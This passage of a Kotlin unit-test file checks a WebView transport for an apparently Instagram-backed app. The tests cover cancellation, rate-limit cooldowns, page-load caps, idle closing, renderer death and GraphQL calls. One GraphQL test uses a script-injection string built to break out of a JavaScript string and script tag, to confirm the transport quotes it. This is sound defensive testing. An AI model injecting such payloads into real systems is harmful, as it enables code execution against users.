        val transport = transport(pages)
        repeat(3) { swipe ->
            val caller = Caller()
            val refresh = launch { caller.run { transport.get("api/v1/media/3100000000000000001/info/") } }
            runCurrent()
            refresh.cancel()
            runCurrent()
            // The page this refresh was loading, if it made one, finishes loading now (no page made later loads by itself).
            gates.take(pages.created.size).forEach { it.complete(Unit) }
            runCurrent()
            assertTrue(refresh.isCancelled, "swipe $swipe")
            assertIs<CancellationException>(caller.ended, "swipe $swipe")
        }

        val next = call(transport, "api/v1/media/3100000000000000001/info/")
        runCurrent()
        if (next.isCompleted) fail("the call after the swipes was not sent: ${next.await().exceptionOrNull()}")
        val page = pages.created.last()
        page.post(reply(page.lastFetchId))
        assertEquals(200, next.await().getOrThrow().code)
        assertEquals(1, pages.created.size, "one page for all the swipes")
    }

    /**
     * R104a: a 429 home page found while finishing a cancelled caller's load must still reach the Pacer, but the cancelled
     * caller may only end with its cancellation. So the 429 is remembered, once: the NEXT call fails RateLimited at once,
     * creating no page and evaluating nothing, and through the real Conservative Pacer that arms the cooldown.
     */
    @Test
    fun aRateLimitedLoadOfACancelledCallerReachesTheNextCallAsRateLimited() = runTest {
        val gate = CompletableDeferred<Unit>()
        val pages = Pages(FakeWebPage(loadError = PageHttpError(429), loadGate = gate, destroyFailsTheLoad = false))
        val transport = transport(pages)
        val cooldowns = InMemoryCooldownStore()
        val pacer = Pacer(PacingPolicy.Conservative, InMemoryRequestLog(), cooldowns, Random(1), now = { testScheduler.currentTime })
        val caller = Caller()
        val abandoned = launch { caller.run { pacer.interactive { transport.get("api/v1/media/3100000000000000001/info/") } } }
        runCurrent()
        val refused = pages.created.single()

        abandoned.cancel()
        runCurrent()
        assertFalse(abandoned.isCompleted, "the cancelled caller waits for the load")
        gate.complete(Unit)
        runCurrent()
        assertTrue(abandoned.isCancelled)
        assertIs<CancellationException>(caller.ended)
        assertFalse(caller.ended is InstagramException, "a cancelled caller never ends with the verdict")
        assertTrue(refused.destroyed)
        assertNull(cooldowns.activeUntil(), "nothing told the Pacer yet")

        val next = async { runCatching { pacer.interactive { transport.get("api/v1/media/3100000000000000001/info/") } } }
        assertIs<InstagramException.RateLimited>(next.await().exceptionOrNull())
        assertEquals(1, pages.attempts, "no page was created for it")
        assertEquals(emptyList(), refused.evaluated)
        assertTrue(checkNotNull(cooldowns.activeUntil()) > testScheduler.currentTime, "the Pacer armed the cooldown")

        // Once: the call after that one starts over (straight on the transport: the Pacer is cooling down).
        val after = call(transport, "api/v1/media/3100000000000000001/info/")
        runCurrent()
        assertEquals(2, pages.created.size)
        pages.created.last().post(reply(1))
        assertEquals(200, after.await().getOrThrow().code)
    }

    /** R104a: `reset()` (a new session) forgets a remembered 429, like every other verdict. */
    @Test
    fun resetForgetsARateLimitedLoadOfACancelledCaller() = runTest {
        val gate = CompletableDeferred<Unit>()
        val pages = Pages(FakeWebPage(loadError = PageHttpError(429), loadGate = gate, destroyFailsTheLoad = false))
        val transport = transport(pages)
        val abandoned = launch { transport.get("api/v1/collections/list/") }
        runCurrent()
        abandoned.cancel()
        runCurrent()
        gate.complete(Unit)
        runCurrent()
        assertTrue(abandoned.isCancelled)

        transport.reset()
        val next = call(transport, "api/v1/collections/list/")
        runCurrent()
        assertEquals(2, pages.created.size)
        pages.created.last().post(reply(1))
        assertEquals(200, next.await().getOrThrow().code)
    }

    /** R104: other failed loads of a cancelled caller are dropped and counted as today, and the caller still ends cancelled. */
    @Test
    fun aCancelledCallersLoadThatFailsDropsThePageAndTheCallerEndsCancelled() = runTest {
        for (failure in listOf<Exception?>(IOException("net::ERR_INTERNET_DISCONNECTED"), PageHttpError(503), null)) {
            val what = failure?.toString() ?: "load timeout"
            val gate = CompletableDeferred<Unit>()
            val pages = Pages(FakeWebPage(loadError = failure, loadGate = gate, destroyFailsTheLoad = false))
            val transport = transport(pages)
            val caller = Caller()
            val start = currentTime
            val abandoned = launch { caller.run { transport.get("api/v1/collections/list/") } }
            runCurrent()
            val broken = pages.created.single()
            abandoned.cancel()
            runCurrent()
            assertFalse(abandoned.isCompleted, what)
            if (failure != null) gate.complete(Unit) else advanceTimeBy(30_000)
            runCurrent()

            assertTrue(abandoned.isCancelled, what)
            assertIs<CancellationException>(caller.ended, what)
            assertFalse(caller.ended is InstagramException, what)
            assertTrue(broken.destroyed, what)
            assertEquals(emptyList(), broken.evaluated, what)
            // The load's bound counts from its start: a cancelled caller waits no longer than one that is not.
            assertTrue(currentTime - start <= 30_000, what)
            // Not a verdict on the account: the next call starts over (and the dropped page still counts towards the cap).
            val next = call(transport, "api/v1/collections/list/")
            runCurrent()
            assertEquals(2, pages.created.size, what)
            pages.created.last().post(reply(1))
            assertEquals(200, next.await().getOrThrow().code, what)
        }
    }

    /** R104: `reset()` and a dead renderer still end a cancelled caller's load at once, as they do any other. */
    @Test
    fun resetOrADeadRendererEndsACancelledCallersLoadAtOnce() = runTest {
        for (end in listOf("reset", "renderer gone")) {
            val pages = Pages(FakeWebPage(loadGate = CompletableDeferred()))
            val transport = transport(pages)
            val caller = Caller()
            val start = currentTime
            val abandoned = launch { caller.run { transport.get("api/v1/collections/list/") } }
            runCurrent()
            val page = pages.created.single()
            abandoned.cancel()
            runCurrent()
            assertFalse(abandoned.isCompleted, end)

            if (end == "reset") transport.reset() else page.die()
            runCurrent()
            assertTrue(abandoned.isCancelled, end)
            assertIs<CancellationException>(caller.ended, end)
            assertEquals(start, currentTime, "$end: at once, not at the load's bound")
            assertTrue(page.destroyed, end)
            assertEquals(emptyList(), page.evaluated, end)
        }
    }

    @Test
    fun aSecondCallWhileTheFirstOneLoadsThePageIsRefusedAndTouchesNothing() = runTest {
        val gate = CompletableDeferred<Unit>()
        val pages = Pages(FakeWebPage(loadGate = gate))
        val transport = transport(pages)
        val first = call(transport, "api/v1/collections/list/")
        runCurrent()
        val page = pages.created.single()

        val second = call(transport, "api/v1/feed/saved/posts/")
        runCurrent()
        assertIs<InstagramException.Transient>(second.await().exceptionOrNull())
        // The half-loaded page is not the second call's to use: nothing evaluated, not destroyed, no second page.
        assertEquals(emptyList(), page.evaluated)
        assertFalse(page.destroyed)
        assertEquals(1, pages.attempts)

        gate.complete(Unit)
        runCurrent()
        // The first call goes on, and it still has id 1.
        assertEquals(listOf(SCRIPT, fetchOf(1, "\"api/v1/collections/list/\"")), page.evaluated)
        page.post(reply(1))
        assertEquals(200, first.await().getOrThrow().code)
    }

    @Test
    fun aRendererThatDiesFailsTheCallInFlightAtOnce() = runTest {
        val pages = Pages()
        val transport = transport(pages)
        val pending = call(transport, "api/v1/collections/list/")
        runCurrent()
        val page = pages.created.single()

        page.die()
        runCurrent()
        // Not after the 30 s call timeout.
        assertIs<InstagramException.Transient>(pending.await().exceptionOrNull())
        assertEquals(0, currentTime)
        assertTrue(page.destroyed)

        val next = call(transport, "api/v1/collections/list/")
        runCurrent()
        assertEquals(2, pages.created.size)
        pages.created.last().post(reply(2))
        assertEquals(200, next.await().getOrThrow().code)
    }

    @Test
    fun aGonePageIsDroppedBeforeTheWaitingCallIsWoken() = runBlocking {
        // Unconfined: the woken call runs inside the complete() that wakes it, so what it sees is what the transport left behind.
        val page = FakeWebPage()
        val destroyedWhenTheCallEnded = mutableListOf<Boolean>()
        val transport = WebViewTransport({ page }, home, SCRIPT, Dispatchers.Unconfined, log = { destroyedWhenTheCallEnded += page.destroyed })
        val pending = async(start = CoroutineStart.UNDISPATCHED) { runCatching { transport.get("api/v1/collections/list/") } }
        assertTrue(pending.isActive, "the call waits for the page's reply")

        page.die()

        assertIs<InstagramException.Transient>(pending.await().exceptionOrNull())
        assertEquals(listOf(true), destroyedWhenTheCallEnded, "the page was still the current one when the call that waited on it ended")
    }

    @Test
    fun aRendererThatDiesBetweenCallsIsReplacedByTheNextCall() = runTest {
        val pages = Pages()
        val transport = transport(pages)
        val first = call(transport, "api/v1/collections/list/")
        runCurrent()
        val page = pages.created.single()
        page.post(reply(1))
        first.await().getOrThrow()

        page.die()
        assertTrue(page.destroyed)
        val next = call(transport, "api/v1/collections/list/")
        runCurrent()
        assertEquals(2, pages.created.size)
        pages.created.last().post(reply(2))
        assertEquals(200, next.await().getOrThrow().code)
    }

    @Test
    fun aRendererThatDiesWhileThePageLoadsFailsTheCallAtOnce() = runTest {
        // As the real page does, destroying it (or its renderer dying) fails the load in progress.
        val pages = Pages(FakeWebPage(loadGate = CompletableDeferred()))
        val transport = transport(pages)
        val pending = call(transport, "api/v1/collections/list/")
        runCurrent()

        pages.created.single().die()
        runCurrent()
        assertIs<InstagramException.Transient>(pending.await().exceptionOrNull())
        assertEquals(0, currentTime)
        assertTrue(pages.created.single().destroyed)
        assertEquals(emptyList(), pages.created.single().evaluated)
    }

    @Test
    fun aDroppedPageThatDiesLaterDoesNotDisturbTheCurrentOne() = runTest {
        val pages = Pages()
        val transport = transport(pages)
        val stuck = call(transport, "api/v1/collections/list/")
        runCurrent()
        val old = pages.created.single()
        advanceTimeBy(30_000)
        runCurrent()
        assertIs<InstagramException.Transient>(stuck.await().exceptionOrNull())

        val pending = call(transport, "api/v1/feed/saved/posts/")
        runCurrent()
        old.die()
        runCurrent()
        assertTrue(pending.isActive)
        pages.created.last().post(reply(2))
        assertEquals(200, pending.await().getOrThrow().code)
        assertFalse(pages.created.last().destroyed)
    }

    @Test
    fun aPageThatThrowsWhenEvaluatingFailsTransientAndIsDropped() = runTest {
        val broken = FakeWebPage(evaluateError = IllegalStateException("evaluateJavascript failed"))
        val pages = Pages(broken)
        val transport = transport(pages)

        val error = assertIs<InstagramException.Transient>(call(transport, "api/v1/collections/list/").await().exceptionOrNull())
        assertTrue(error.causes().any { it is IllegalStateException }, "the Transient keeps what went wrong")
        assertTrue(broken.destroyed)

        val next = call(transport, "api/v1/collections/list/")
        runCurrent()
        assertEquals(2, pages.created.size)
        pages.created.last().post(reply(2))
        assertEquals(200, next.await().getOrThrow().code)
    }

    @Test
    fun atMostThreePagesAreCreatedUntilReset() = runTest {
        val pages = Pages(
            FakeWebPage(loadError = IOException("first")),
            FakeWebPage(loadError = IOException("second")),
            FakeWebPage(loadError = IOException("third")),
        )
        val lines = mutableListOf<String>()
        val transport = transport(pages, log = lines::add)
        repeat(3) { assertIs<InstagramException.Transient>(call(transport, "api/v1/collections/list/").await().exceptionOrNull()) }
        assertEquals(3, pages.attempts)

        // The site is loaded at most three times per session: a fourth call creates nothing, however often it is made.
        repeat(2) { assertIs<InstagramException.Transient>(call(transport, "api/v1/collections/list/").await().exceptionOrNull()) }
        assertEquals(3, pages.attempts)
        assertEquals("GET api/v1/collections/list/ -> page limit (0 ms)", lines.last())

        // reset() (a login, a logout) starts a new session.
        transport.reset()
        val after = call(transport, "api/v1/collections/list/")
        runCurrent()
        assertEquals(4, pages.attempts)
        pages.created.last().post(reply(1))
        assertEquals(200, after.await().getOrThrow().code)
    }

    @Test
    fun allowNewAttemptsGivesBackThePageCountAndNothingElse() = runTest {
        val pages = Pages(*Array(6) { FakeWebPage(loadError = IOException("load $it")) })
        val transport = transport(pages)
        repeat(4) { assertIs<InstagramException.Transient>(call(transport, "api/v1/collections/list/").await().exceptionOrNull()) }
        assertEquals(3, pages.attempts, "the limit is reached")

        // A new user action (a sync run, a check, a lab tap) gets three pages of its own, and no more.
        transport.allowNewAttempts()
        repeat(4) { assertIs<InstagramException.Transient>(call(transport, "api/v1/collections/list/").await().exceptionOrNull()) }
        assertEquals(6, pages.attempts)

        transport.allowNewAttempts()
        val after = call(transport, "api/v1/collections/list/")
        runCurrent()
        assertEquals(7, pages.attempts)
        pages.created.last().post(reply(1))
        assertEquals(200, after.await().getOrThrow().code)
    }

    @Test
    fun allowNewAttemptsNeverDestroysThePageOrDisturbsACallInFlight() = runTest {
        val pages = Pages()
        val transport = transport(pages)
        val pending = call(transport, "api/v1/collections/list/")
        runCurrent()
        val page = pages.created.single()

        transport.allowNewAttempts()
        assertFalse(page.destroyed)
        assertTrue(pending.isActive, "the call in flight still waits for its reply")
        page.post(reply(1))
        assertEquals(200, pending.await().getOrThrow().code)

        // Between calls too: the same page serves the next one.
        transport.allowNewAttempts()
        assertFalse(page.destroyed)
        val next = call(transport, "api/v1/feed/saved/posts/")
        runCurrent()
        assertEquals(1, pages.created.size)
        page.post(reply(2))
        assertEquals(200, next.await().getOrThrow().code)
    }

    @Test
    fun allowNewAttemptsNeverClearsALoginOrChallengeLanding() = runTest {
        for ((landing, expected) in listOf(
            "https://www.instagram.com/accounts/login/" to InstagramException.LoginRequired::class,
            "https://www.instagram.com/challenge/" to InstagramException.ChallengeRequired::class,
        )) {
            val pages = Pages(FakeWebPage(landing = landing))
            val transport = transport(pages)
            assertTrue(expected.isInstance(call(transport, "api/v1/collections/list/").await().exceptionOrNull()), landing)

            // Only reset() (the owner logged in, or finished the challenge) lets the next call load the site again.
            repeat(2) {
                transport.allowNewAttempts()
                assertTrue(expected.isInstance(call(transport, "api/v1/collections/list/").await().exceptionOrNull()), landing)
            }
            assertEquals(1, pages.attempts, landing)
            assertEquals(emptyList(), pages.created.single().evaluated, landing)
        }
    }

    @Test
    fun thePageLimitCountsCreationsThatThrowToo() = runTest {
        val pages = Pages(createErrors = List(3) { IllegalStateException("no WebView provider") })
        val transport = transport(pages)
        repeat(4) { assertIs<InstagramException.Transient>(call(transport, "api/v1/collections/list/").await().exceptionOrNull()) }
        assertEquals(3, pages.attempts)
    }

    @Test
    fun anEnclosingTimeoutIsNotSwallowedIntoTransient() = runTest {
        // The caller's own deadline wins: it is a cancellation of the caller, not an Instagram failure.
        val replyless = Pages()
        val transport = transport(replyless)
        assertFailsWith<TimeoutCancellationException> { withTimeout(10_000) { transport.get("api/v1/collections/list/") } }
        assertEquals(10_000, currentTime)

        // R104: a caller whose deadline passes while the page loads waits for the load to end (here its own 30 s bound, counted
        // from its start), and only then gets its own timeout; the page that never loaded is dropped.
        val slow = Pages(FakeWebPage(loadGate = CompletableDeferred()))
        val loading = transport(slow)
        assertFailsWith<TimeoutCancellationException> { withTimeout(10_000) { loading.get("api/v1/collections/list/") } }
        assertEquals(10_000 + 30_000, currentTime)
        assertTrue(slow.created.single().destroyed)
    }

    /**
     * T9: R93's idle time must outlast every gap a sync run leaves between two calls of its own: the Pacer's longest break with
     * its longest gap, and the longest transient backoff (288 s with its jitter). Otherwise a run would reload the site mid-run.
     */
    @Test
    fun theIdleTimeOutlastsThePacersLongestPauseAndTheLongestBackoff() {
        val conservative = PacingPolicy.Conservative
        assertTrue(WebViewTransport.IDLE_MS > 288_000)
        assertTrue(WebViewTransport.IDLE_MS > LONGEST_TRANSIENT_WAIT_MS, "the longest transient backoff: $LONGEST_TRANSIENT_WAIT_MS")
        assertTrue(WebViewTransport.IDLE_MS > conservative.breakMs.last + conservative.maxGapMs, "the longest break with its gap")
    }

    @Test
    fun anIdlePageIsClosedAfterFiveMinutes() = runTest {
        val pages = Pages()
        val transport = transport(pages)
        completedCall(transport, pages, 1)
        val first = pages.created.single()

        advanceTimeBy(WebViewTransport.IDLE_MS - 1)
        runCurrent()
        assertFalse(first.destroyed)
        advanceTimeBy(1)
        runCurrent()
        assertTrue(first.destroyed)

        // The next call starts over: a new page, loaded, and the call goes through.
        assertEquals(200, completedCall(transport, pages, 2).code)
        assertEquals(2, pages.created.size)
        assertEquals(listOf(home), pages.created.last().loaded)
        assertEquals(listOf(SCRIPT, fetchOf(2, "\"api/v1/collections/list/\"")), pages.created.last().evaluated)
    }

    @Test
    fun aCallBeforeTheDeadlineKeepsThePageOpen() = runTest {
        val pages = Pages()
        val transport = transport(pages)
        completedCall(transport, pages, 1)
        val page = pages.created.single()

        advanceTimeBy(200_000)
        runCurrent()
        completedCall(transport, pages, 2)
        advanceTimeBy(200_000)
        runCurrent()
        // The first call's deadline (300 s) has passed, and the second call re-armed the timer.
        assertFalse(page.destroyed)
        assertEquals(1, pages.created.size)

        // The new deadline is a full IDLE_MS after the second call (200 s + 300 s).
        advanceTimeBy(WebViewTransport.IDLE_MS - 200_000 - 1)
        runCurrent()
        assertFalse(page.destroyed)
        advanceTimeBy(1)
        runCurrent()
        assertTrue(page.destroyed)
    }

    @Test
    fun theIdleTimerNeverClosesThePageUnderACall() = runTest {
        val pages = Pages()
        val transport = transport(pages)
        completedCall(transport, pages, 1)
        val page = pages.created.single()

        // A second call starts a second before the first call's deadline, and its page does not reply yet.
        advanceTimeBy(WebViewTransport.IDLE_MS - 1_000)
        runCurrent()
        val second = call(transport, "api/v1/feed/saved/posts/")
        runCurrent()
        assertTrue(second.isActive)
        // The call's start cancelled the timer: none is pending while a call runs.
        assertEquals(0, pendingIdleTimers())

        advanceTimeBy(5_000)
        runCurrent()
        assertFalse(page.destroyed, "the first call's deadline passed under the second call")
        assertTrue(second.isActive)
        page.post(reply(2, body = "in time"))
        assertEquals("in time", second.await().getOrThrow().body)
        assertEquals(1, pages.created.size)
    }

    @Test
    fun anIdleCloseGivesBackThePageLimit() = runTest {
        val pages = Pages()
        val transport = transport(pages)
        // No allowNewAttempts, no reset: each visit ends cleanly with an idle close, so the limit never builds up.
        repeat(WebViewTransport.MAX_PAGES + 1) { n ->
            assertEquals(200, completedCall(transport, pages, n + 1L).code)
            advanceTimeBy(WebViewTransport.IDLE_MS)
            runCurrent()
        }
        assertEquals(WebViewTransport.MAX_PAGES + 1, pages.created.size)
        assertTrue(pages.created.all { it.destroyed })
    }

    @Test
    fun aPageDroppedByAFailureStillCountsAfterTheTimerWouldHaveFired() = runTest {
        val pages = Pages(
            FakeWebPage(loadError = PageHttpError(500)),
            FakeWebPage(loadError = IOException("net::ERR_INTERNET_DISCONNECTED")),
            FakeWebPage(), // loads fine and never replies: the call times out
        )
        val transport = transport(pages)
        assertIs<InstagramException.Transient>(call(transport, "api/v1/collections/list/").await().exceptionOrNull())
        assertIs<InstagramException.Transient>(call(transport, "api/v1/collections/list/").await().exceptionOrNull())
        val timedOut = call(transport, "api/v1/collections/list/")
        runCurrent()
        advanceTimeBy(30_000)
        runCurrent()
        assertIs<InstagramException.Transient>(timedOut.await().exceptionOrNull())
        assertEquals(WebViewTransport.MAX_PAGES, pages.attempts)
        assertTrue(pages.created.all { it.destroyed })

        // No page exists, so no timer ran: the idle time gives nothing back.
        advanceTimeBy(WebViewTransport.IDLE_MS + 1)
        runCurrent()
        assertIs<InstagramException.Transient>(call(transport, "api/v1/collections/list/").await().exceptionOrNull())
        assertEquals(WebViewTransport.MAX_PAGES, pages.attempts, "the cap holds")
    }

    @Test
    fun aPageThatDiedBetweenCallsIsNotAnIdleCloseAndKeepsCounting() = runTest {
        val lines = mutableListOf<String>()
        val pages = Pages()
        val transport = transport(pages, log = lines::add)
        // Each page serves a call, and then its renderer dies while the idle timer is pending.
        repeat(WebViewTransport.MAX_PAGES) { n ->
            completedCall(transport, pages, n + 1L)
            pages.created.last().die()
        }
        advanceTimeBy(WebViewTransport.IDLE_MS + 1)
        runCurrent()

        // The timer found another page than the one it was armed for (none): it closed nothing, logged nothing, gave nothing back.
        assertTrue(lines.none { "idle" in it }, lines.toString())
        assertIs<InstagramException.Transient>(call(transport, "api/v1/collections/list/").await().exceptionOrNull())
        assertEquals(WebViewTransport.MAX_PAGES, pages.attempts)
    }

    @Test
    fun aRendererDeathBetweenCallsLeavesNoIdleTimerPending() = runTest {
        val pages = Pages()
        val transport = transport(pages)
        completedCall(transport, pages, 1)
        val dead = pages.created.single()
        assertEquals(1, pendingIdleTimers(), "the call that just ended armed the timer")

        dead.die()
        runCurrent()
        // The page is dropped at once and its timer goes with it: a dead page is not held for the idle time. This `0 pending`
        // assertion is the only one here that tests pageGone()'s cancel (without it the timer stays until the idle deadline).
        assertTrue(dead.destroyed)
        assertEquals(0, pendingIdleTimers())

        // What follows is a regression check that holds without the fix too (the timer's own `page === armed` test spares the new
        // page): the next call starts over, and its own timer is the only one that can close the new page.
        advanceTimeBy(100_000)
        runCurrent()
        completedCall(transport, pages, 2)
        val fresh = pages.created.last()
        assertEquals(2, pages.created.size)
        assertEquals(1, pendingIdleTimers())
        advanceTimeBy(WebViewTransport.IDLE_MS - 100_000 + 1)
        runCurrent()
        assertFalse(fresh.destroyed, "the first page's deadline has passed")
        advanceTimeBy(100_000)
        runCurrent()
        assertTrue(fresh.destroyed)
        assertEquals(0, pendingIdleTimers())
    }

    @Test
    fun resetCancelsTheIdleTimer() = runTest {
        val pages = Pages()
        val transport = transport(pages)
        completedCall(transport, pages, 1)
        assertEquals(1, pendingIdleTimers())

        transport.reset()
        runCurrent()
        assertTrue(pages.created.single().destroyed)
        assertEquals(0, pendingIdleTimers())

        advanceTimeBy(100_000)
        runCurrent()
        completedCall(transport, pages, 2)
        val second = pages.created.last()
        assertEquals(2, pages.created.size)

        // The first call's deadline passes, and the page that came after the reset is not touched by it.
        advanceTimeBy(WebViewTransport.IDLE_MS - 100_000 + 1)
        runCurrent()
        assertFalse(second.destroyed)
        // Its own deadline is IDLE_MS after its call.
        advanceTimeBy(100_000)
        runCurrent()
        assertTrue(second.destroyed)
    }

    // ---- R106: closePage(), the idle close made immediate, when the session needs the owner ----

    @Test
    fun closePageClosesThePageNowAsTheIdleCloseWouldLater() = runTest {
        val lines = mutableListOf<String>()
        val pages = Pages()
        val transport = transport(pages, log = lines::add)
        completedCall(transport, pages, 1)
        val page = pages.created.single()
        assertEquals(1, pendingIdleTimers())

        transport.closePage()
        runCurrent()
        assertTrue(page.destroyed)
        assertEquals(0, pendingIdleTimers(), "nothing is left to close later")
        assertEquals("page closed (owner needed)", lines.last())

        // The next call starts over on a new page.
        assertEquals(200, completedCall(transport, pages, 2).code)
        assertEquals(2, pages.created.size)
        assertEquals(listOf(home), pages.created.last().loaded)
    }

    /** Like the idle close: a clean end of a visit gives back the page cap. */
    @Test
    fun closePageGivesBackThePageLimit() = runTest {
        val pages = Pages(FakeWebPage(loadError = IOException("first")), FakeWebPage(loadError = IOException("second")))
        val transport = transport(pages)
        repeat(2) { assertIs<InstagramException.Transient>(call(transport, "api/v1/collections/list/").await().exceptionOrNull()) }
        completedCall(transport, pages, 1)
        assertEquals(WebViewTransport.MAX_PAGES, pages.attempts, "the cap is used up")

        transport.closePage()
        assertEquals(200, completedCall(transport, pages, 2).code)
        assertEquals(WebViewTransport.MAX_PAGES + 1, pages.attempts)
    }

    /** R89, R97: the cap is never given back without a page. With none, there is nothing to close and nothing to give back. */
    @Test
    fun closePageWithNoPageGivesNothingBack() = runTest {
        val pages = Pages(*Array(WebViewTransport.MAX_PAGES) { FakeWebPage(loadError = IOException("load $it")) })
        val transport = transport(pages)
        repeat(WebViewTransport.MAX_PAGES) { assertIs<InstagramException.Transient>(call(transport, "api/v1/collections/list/").await().exceptionOrNull()) }

        transport.closePage()
        assertIs<InstagramException.Transient>(call(transport, "api/v1/collections/list/").await().exceptionOrNull())
        assertEquals(WebViewTransport.MAX_PAGES, pages.attempts, "the cap holds")
    }

    /** Unlike reset(), it is no change of session: a login or challenge landing stays remembered. */
    @Test
    fun closePageKeepsALoginOrChallengeLanding() = runTest {
        for ((landing, expected) in listOf(
            "https://www.instagram.com/accounts/login/" to InstagramException.LoginRequired::class,
            "https://www.instagram.com/challenge/" to InstagramException.ChallengeRequired::class,
        )) {
            val pages = Pages(FakeWebPage(landing = landing))
            val transport = transport(pages)
            assertTrue(expected.isInstance(call(transport, "api/v1/collections/list/").await().exceptionOrNull()), landing)

            transport.closePage()
            assertTrue(expected.isInstance(call(transport, "api/v1/collections/list/").await().exceptionOrNull()), landing)
            assertEquals(1, pages.attempts, landing)
        }
    }

    /** Nor does it forget a 429 a cancelled caller's load found (R104a): the Pacer must still hear it. */
    @Test
    fun closePageKeepsARateLimitedLoadOfACancelledCaller() = runTest {
        val gate = CompletableDeferred<Unit>()
        val pages = Pages(FakeWebPage(loadError = PageHttpError(429), loadGate = gate, destroyFailsTheLoad = false))
        val transport = transport(pages)
        val abandoned = launch { transport.get("api/v1/collections/list/") }
        runCurrent()
        abandoned.cancel()
        runCurrent()
        gate.complete(Unit)
        runCurrent()

        transport.closePage()
        assertIs<InstagramException.RateLimited>(call(transport, "api/v1/collections/list/").await().exceptionOrNull())
        assertEquals(1, pages.attempts)
    }

    /** A call in flight on the page that closes fails at once, as with reset(), not at its timeout. */
    @Test
    fun closePageFailsACallInFlightAtOnce() = runTest {
        for (phase in listOf("waiting for the reply", "loading")) {
            val pages = Pages(if (phase == "loading") FakeWebPage(loadGate = CompletableDeferred()) else FakeWebPage())
            val transport = transport(pages)
            val start = currentTime
            val pending = call(transport, "api/v1/collections/list/")
            runCurrent()
            val page = pages.created.single()

            transport.closePage()
            runCurrent()
            assertIs<InstagramException.Transient>(pending.await().exceptionOrNull(), phase)
            assertEquals(start, currentTime, phase)
            assertTrue(page.destroyed, phase)
        }
    }

    @Test
    fun allowNewAttemptsNeverCancelsTheIdleTimer() = runTest {
        val pages = Pages()
        val transport = transport(pages)
        completedCall(transport, pages, 1)
        val page = pages.created.single()

        advanceTimeBy(200_000)
        runCurrent()
        // A new user action only gives back the page count: the page's deadline is still the one its last call set.
        transport.allowNewAttempts()
        assertEquals(1, pendingIdleTimers())
        advanceTimeBy(WebViewTransport.IDLE_MS - 200_000 - 1)
        runCurrent()
        assertFalse(page.destroyed)
        advanceTimeBy(1)
        runCurrent()
        assertTrue(page.destroyed)
    }

    /**
     * A login landing drops the page, so no page exists to arm a timer for and no idle close ever runs in it: the landing is
     * remembered by the transport itself, and the idle time that passes changes nothing about it.
     */
    @Test
    fun aLoginLandingStaysStickyPastTheIdleDeadline() = runTest {
        val pages = Pages(FakeWebPage(landing = "https://www.instagram.com/accounts/login/?next=%2F"))
        val transport = transport(pages)
        assertIs<InstagramException.LoginRequired>(call(transport, "api/v1/collections/list/").await().exceptionOrNull())
        assertEquals(0, pendingIdleTimers(), "the dropped page has no timer")

        advanceTimeBy(WebViewTransport.IDLE_MS + 1)
        runCurrent()
        // Still the owner's to fix: no new page, nothing evaluated, until reset().
        assertIs<InstagramException.LoginRequired>(call(transport, "api/v1/collections/list/").await().exceptionOrNull())
        assertEquals(1, pages.attempts)
        assertEquals(emptyList(), pages.created.single().evaluated)
    }

    @Test
    fun theIdleCloseIsLogged() = runTest {
        val lines = mutableListOf<String>()
        val pages = Pages()
        val transport = transport(pages, log = lines::add)
        completedCall(transport, pages, 1)
        advanceTimeBy(WebViewTransport.IDLE_MS - 1)
        runCurrent()
        assertEquals(0, lines.count { it == "page closed (idle)" }, "a page that is reused is not closed")

        completedCall(transport, pages, 2)
        advanceTimeBy(WebViewTransport.IDLE_MS - 1)
        runCurrent()
        assertEquals(0, lines.count { it == "page closed (idle)" })

        advanceTimeBy(1)
        runCurrent()
        // Exactly once, and later time adds nothing.
        advanceTimeBy(WebViewTransport.IDLE_MS * 2)
        runCurrent()
        assertEquals(
            listOf(
                "GET api/v1/collections/list/ -> 200 (0 ms)",
                "GET api/v1/collections/list/ -> 200 (0 ms)",
                "page closed (idle)",
            ),
            lines,
        )
    }

    @Test
    fun aCallThatEndsWithoutAReplyStillLeavesTheTimerArmedWhenThePageIsKept() = runTest {
        // A caller that gives up while waiting keeps the page (the late reply is ignored), and so does a network failure inside it.
        for (outcome in listOf("cancelled", "network failure")) {
            val pages = Pages()
            val transport = transport(pages)
            when (outcome) {
                "cancelled" -> {
                    val abandoned = launch { transport.get("api/v1/collections/list/") }
                    runCurrent()
                    abandoned.cancel()
                    runCurrent()
                }
                else -> {
                    val failing = call(transport, "api/v1/collections/list/")
                    runCurrent()
                    pages.created.single().post("""{"id":1,"code":-1,"contentType":null,"body":null,"redirected":false}""")
                    assertIs<InstagramException.Transient>(failing.await().exceptionOrNull())
                }
            }
            val page = pages.created.single()
            assertFalse(page.destroyed, outcome)

            advanceTimeBy(WebViewTransport.IDLE_MS - 1)
            runCurrent()
            assertFalse(page.destroyed, outcome)
            advanceTimeBy(1)
            runCurrent()
            assertTrue(page.destroyed, outcome)
            // Left for the next round: this transport's timer is over, and the previous round's too.
            assertEquals(0, pendingIdleTimers(), outcome)
        }
    }

    // --- GraphQL: the website's own query, one POST from the same page, under the same rules as a GET ------------------------

    private fun TestScope.graphQlCall(transport: WebViewTransport, docId: String = "123", variables: String = """{"first":12}"""): Deferred<Result<RawReply>> =
        async { runCatching { transport.graphql(WebGraphQl.SAVED_COLLECTIONS, docId, variables) } }

    /** What the transport evaluates for a GraphQL call with the default arguments of [graphQlCall]. */
    private fun graphQlOf(id: Long) =
        "window.__igGraphQl && window.__igGraphQl($id,\"PolarisProfileSavedTabContentQuery\",\"123\",\"{\\\"first\\\":12}\")"

    @Test
    fun graphqlEvaluatesTheGraphQlCallWithItsArguments() = runTest {
        val pages = Pages()
        val transport = transport(pages)
        val pending = graphQlCall(transport)
        runCurrent()
        val page = pages.created.single()
        assertEquals(listOf(home), page.loaded)
        page.post(reply(1, body = """{"data":{}}"""))

        val result = pending.await().getOrThrow()
        assertEquals(200, result.code)
        assertEquals("""{"data":{}}""", result.body)
        // The script goes in, then exactly one call, every argument JSON-quoted.
        assertEquals(
            listOf(SCRIPT, "window.__igGraphQl && window.__igGraphQl(1,\"PolarisProfileSavedTabContentQuery\",\"123\",\"{\\\"first\\\":12}\")"),
            page.evaluated,
        )

        // Quoting holds for variables that would break out of a string or the script tag (a doc id is digits only, below).
        val hostile = graphQlCall(transport, docId = "27584326974521636", variables = "</script>\");x(\"\\")
        runCurrent()
        assertEquals(
            "window.__igGraphQl && window.__igGraphQl(2,\"PolarisProfileSavedTabContentQuery\",\"27584326974521636\",\"</script>\\\");x(\\\"\\\\\")",
            page.evaluated.last(),
        )
        page.post(reply(2))
        assertEquals(200, hostile.await().getOrThrow().code)
        assertEquals(1, pages.created.size)
    }

    @Test
    fun graphqlSharesTheBusyRuleAndTheLandingCheck() = runTest {
